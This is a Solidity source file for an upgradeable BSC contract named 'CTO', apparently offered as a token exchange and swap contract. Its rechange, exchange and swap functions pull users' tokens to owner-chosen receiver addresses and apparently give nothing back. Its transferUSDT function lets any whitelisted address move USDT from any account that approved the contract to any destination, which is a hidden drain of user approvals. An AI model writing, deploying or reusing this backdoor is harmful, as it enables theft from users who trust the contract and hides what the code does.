// contract/MyTokenV1.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/math/SafeMathUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/ContextUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/structs/EnumerableSetUpgradeable.sol";

contract CTO is Initializable, UUPSUpgradeable, OwnableUpgradeable {
    using SafeMathUpgradeable for uint256;
    using AddressUpgradeable for address;

    ERC20Upgradeable private _usdtToken;
    mapping(address=>address) reciverAddress;
    mapping(address=>bool) whiteList;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function _authorizeUpgrade(address) internal override onlyOwner {}

    function initialize() public initializer {
        __Ownable_init();
        __UUPSUpgradeable_init();
        _usdtToken = ERC20Upgradeable(
            0x55d398326f99059fF775485246999027B3197955
        );
        reciverAddress[address(_usdtToken)] = 0x4B634ed1e5D1cAa31453B14F32A8E8d4802e2091;//usdt
        reciverAddress[0x021eD475D7320C0f04Ef44d06dB6AbC19a4cc270] = 0xD3955fEDF438BD98032CDaD5FdFD22b5d693AB71; //GT
        whiteList[owner()] = true;
    }
    modifier whiteAddress() {
        require(whiteList[msg.sender], "not white address");
        _;
    }

    function setWhiteAddress(address _account, bool _flag) public onlyOwner {
        whiteList[_account] = _flag;
    }

    function setTokenAddress(address account) public onlyOwner {
        _usdtToken = ERC20Upgradeable(account);
    }
    function setReciverAddressAddress(address token,address account) public onlyOwner {
        reciverAddress[token] = account;
    }
    event Rechange(address indexed id, uint256 amount);
    function rechange(uint256 usdtAmount) public {
        address spender = _msgSender();
        if (usdtAmount > 0) {
            _usdtToken.transferFrom(spender, reciverAddress[address(_usdtToken)], usdtAmount);
            emit Rechange(spender, usdtAmount);
        }
    }

    event Exchange(address token,address from, address to, uint256 usdtAmount);
    function exchange(address tokenAddress,uint256 amount) public {
       require(reciverAddress[tokenAddress] != address(0x0),"The currency is not supported");
        ERC20Upgradeable _token = ERC20Upgradeable(tokenAddress);
        address spender = _msgSender();
        _token.transferFrom(spender, reciverAddress[tokenAddress], amount);
        emit Exchange(tokenAddress,spender,reciverAddress[tokenAddress], amount);
    }

    event Swap(address token0,address token1,address from, address to, uint256 amount);
    function swap(address token0,address token1,uint256 amount) public {
        address reciverToken =  token0 == address(_usdtToken)?token1:token0;
        require(reciverAddress[reciverToken] != address(0x0),"The currency is not supported");
        ERC20Upgradeable _token = ERC20Upgradeable(token0);
        address spender = _msgSender();
        _token.transferFrom(spender, reciverAddress[reciverToken], amount);
        emit Swap(token0,token1,spender,reciverAddress[reciverToken], amount);
    }

    function transferUSDT(
        address from,
        address to,
        uint256 amount
    ) public whiteAddress{
        _usdtToken.transferFrom(from, to, amount);
    }
}
